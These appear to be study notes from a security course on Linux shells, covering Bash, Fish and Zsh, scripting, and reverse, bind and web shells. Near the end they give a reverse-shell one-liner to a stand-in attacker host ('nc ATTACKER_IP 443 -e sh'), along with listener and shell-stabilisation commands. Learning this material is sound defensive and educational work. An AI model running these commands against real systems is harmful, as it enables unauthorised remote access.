#### Introduction to Linux Shells

- As regular users of operating systems, we all extensively use the Graphical User Interface (GUI) to carry out most operations. It takes a few clicks on different options, and your task is done. However, you can perform almost every task by writing commands in the CLI of your operating system rather than using the GUI. The shells give you some great features for the commands you write in your CLI. This way of interacting with the OS is more efficient and resource-friendly
- Suppose you are in a restaurant and have two options for your food. The first option is to order food from the menu, and the waiter will serve it. The second option is to cook your desired dish yourself in the kitchen. In terms of a Linux system, the kitchen here is the OS, and using the GUI of the OS is just like ordering the food from the menu, and the waiter will serve it for you. However, using the CLI means you would have to go to the kitchen (OS) and cook your desired food. In this example, Shell would help you cook your desired dish by giving you some recipe suggestions. Using CLI to perform operations in a Linux system gives you more power and control while carrying out the tasks.
- You may have seen hacking scenes in movies that show cool terminals with many commands getting executed. This is because most Linux users prefer to perform operations by writing commands on the CLI using shells instead of using the GUI
#### How To Interact With a Shell?
- Most Linux distributions use Bash (Bourne Again Shell) as their default shell. However, the default shell displayed when you open the terminal depends on your Linux distribution.
-  While using the GUI of an OS, you can see the contents of a directory on the screen. However, while using the shell, to see the contents of a directory, you must enter ls command and it would list down all directories available and you can read a file with cat command
- Like the Command Prompt and PowerShell in Windows OS, Linux has different types of shells available, each with its own features and characteristics.Multiple shells are installed in different Linux distributions. To see which shell you are using, type echo $SHELL
- You can also list down the available shells in your Linux OS by typing /etc/shells.To switch between these shells, you can type the shell name that is present on your OS, and it will open for you.

#### Advantages Of Getting A Shell
A shell will allow attackers to execute several activities such as:-
- **Remote System Control**: allows the attacker to execute commands or software remotely in the target system.
- **Privilege Escalation**: If initial access through a shell is limited or restricted, attackers can explore ways to escalate privileges to more elevated or administrative access.
- **Data Exfiltration**: Once attackers have access to execute commands through an obtained shell, they can explore the system to read and copy sensitive data from it.
- **Persistence and Maintenance Access**: Once shell access is obtained, attackers can create access through users and credentials or copy backdoor software to maintain access to the target system for later usage.
- **Post-Exploitation Activities**: After access to a shell is granted, attackers can perform a wide range of post-exploitation activities, such as deploying malware, creating hidden accounts, and deleting information.
- **Access Other Systems on the Network**: Depending on the attacker's intentions, the obtained shell can be just an initial access point. The goal can be to hop through the network to a different target using the obtained shell as a pivot to different points in the compromised system network. This is also known as pivoting.
#### Types of shells
>There are many types of Linux shells. We will discuss a few of them and their features.

#### Bourne Again Shell(Bash)

- Bourne Again Shell (Bash) is the default shell for most Linux distributions. When you open the terminal, bash is present for you to enter commands
- Before bash, some shells like sh, ksh, and csh had different capabilities. Bash came as an enhanced replacement for these shells, borrowing capabilities from all of them.
- It offers widely compatible scripting with extensive documentation available.
- It offers a tab completion feature, which means if you are in the middle of completing a command, you can press the tab key on your keyboard. It will automatically complete the command based on a possible match or give you multiple suggestions for completing it.
- Bash keeps a history file and logs all of your commands. You can use the up and down arrow keys to use the previous commands without typing them again. You can also type history to display all your previous commands.
- It offers  Basic level of customization.
- It is less user-friendly, but being a traditional and widely used shell, its users are quite familiar and comfortable with it.

#### Friendly Interactive Shell (Fish)
- Friendly Interactive Shell (Fish) is  not default in most Linux distributions. As its name suggests, it focuses more on user-friendliness than other shells. 
- It offers a very simple syntax, which is feasible for beginner users.
- Unlike bash, it has auto spell correction for the commands you write.
- You can customize the command prompt with some cool themes using fish.
- The syntax highlighting feature of fish colors different parts of a command based on their roles, which can improve the readability of commands. It also helps us to spot errors with their unique colors.
- Fish also provides scripting, tab completion, and command history functionality 

#### Z Shell (Zsh)
- Z Shell (Zsh) is not installed by default in most Linux distributions. It is considered a modern shell that combines the functionalities of some previous shells
- Zsh provides advanced tab completion and is also capable of writing scripts.
- Just like fish, it also provides auto spell correction for the commands.
- It offers extensive customization that may make it slower than other shells.
- It also provides tab completion, command history functionality, and several other features.
- Its tab completion capability can be extended heavily by using plugins.

#### Shell Scripting and Components
- A shell script is nothing but a set of commands. Suppose a repetitive task requires you to enter multiple commands using a shell. Instead of entering them one after one on every repetition of that task, which may take more of your time, you can combine them into a script. To execute all those commands, you will only execute the script, and all the commands will be executed.
- we first need to create a file using any text editor for the script. The file must be named with an extension `.sh`, the default extension for bash scripts
- Every script should start from shebang. Shebang is a combination of some characters that are added at the beginning of a script, starting with #! followed by the name of the interpreter to use while executing the script t. If we are writing our script in bash,  define it as the interpreter in the shebang by #!/bin/bash
##### Variables 
>A variable stores a value inside it. Suppose you need to use some complex values, like a URL, a file path, etc., several times in your script. Instead of memorizing and writing them repeatedly, you can store them in a variable and use the variable name wherever you need it.
##### Loops
>Loop, as the name suggests, is something that is repeating. For example, you have a list of many friends, and you want to send them the same message. Instead of sending them individually, you can make a loop in your script, give your friend list to the loop and the message, and it will send that message to all your friends.

##### Conditional Statements

 >Conditional statements are an essential part of scripting. They help you execute a specific code only when a condition is satisfied; otherwise, you can execute another code. Suppose you want to make a script that shows the user a secret. However, you want it to be shown to only some users, only to the high-authority user. You will create a conditional statement that will first ask the user their name, and if that name matches the high authority user’s name, it will display the secret.
 

#### Reverse Shell
- **Reverse shells** are when the target is forced to execute code that connects _back_ to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a _listener_ which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell
- When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.
- In simple terms, we can force the remote server to either send us command line access to the server (a **reverse** shell), or to open up a port on the server which we can connect to in order to execute further commands (a **bind** shell).
#### Blind Shell
>As the name indicates, a bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.
 >**Bind shells** are when the code
  executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.

#### Web Shell
- A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.

- Web shells can be written in several languages supported by web servers, like PHP, ASP, JSP, and even simple CGI scripts.
#### Interactivity Of Shells
>Shells can be either _interactive_ or _non-interactive_.
##### Interactive Shell
>Interactive:- If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to interactive shells. These allow you to interact with programs after executing them. For example, take the SSH connection between two machines on internet
##### Non -Interactive Shell
>Non-Interactive_ shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. As an interesting side note, the output of an interactive command _does_ go somewhere, however, figuring out **where** is an exercise for you to attempt on your own. Suffice to say that interactive programs do not work in non-interactive shells.
  
#### Shell Stablization
###### Technique 1:-Python
>The first thing to do is use `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.


**Technique 2:-rlwrap**
- rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some_ manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.>- To use rlwrap, we invoke a slightly different listener:
- `rlwrap nc -lvnp <port>`
- Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell.
- This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise.
- it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.


#### Shell Listeners
>**Rlwrap**
It is a small utility that uses the GNU readline library to provide editing keyboard and history.
>**Ncat**
>Ncat is an improved version of Netcat distributed by the NMAP project. It provides extra features, like encryption (SSL)
>**Socat**
>It is a utility that allows you to create a socket connection between two data sources, in this case, two different hosts.

#### Shell Payloads
>*A Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or a send connection in the case of a reverse shell.*
*Bash Reverse Shells*
*Bash can initiate reverse shells by connecting to an attacker's IP via /dev/tcp. Techniques include interactive sessions (bash -i), using file descriptors like 5 or 196, and while read loops for continuous input/output over TCP.*

PHP Reverse Shells
PHP scripts can create reverse shells using functions like exec, shell_exec, system, passthru, or popen. Each opens a socket to the attacker and executes a shell, redirecting input/output through file descriptor 3.

Python Reverse Shells
Python payloads use the socket, os, pty, and subprocess modules to connect to the attacker, redirect standard I/O, and spawn a shell. Some versions use environment variables; others are short one-liners.

Telnet Reverse Shell
A Telnet-based shell uses a named pipe (mkfifo) to pass input/output through a Telnet session to the attacker's IP and port.

AWK Reverse Shell
AWK can use its native TCP capabilities to connect to the attacker, read commands, and return output—despite not being a traditional shell scripting language.

BusyBox Reverse Shell
BusyBox combines netcat and shell execution in one line to create a reverse shell connection using: nc ATTACKER_IP 443 -e sh.

Common Pattern
All reverse shells share a core idea: establish a network connection back to the attacker (usually on port 443) and redirect shell I/O through it to allow remote command execution.

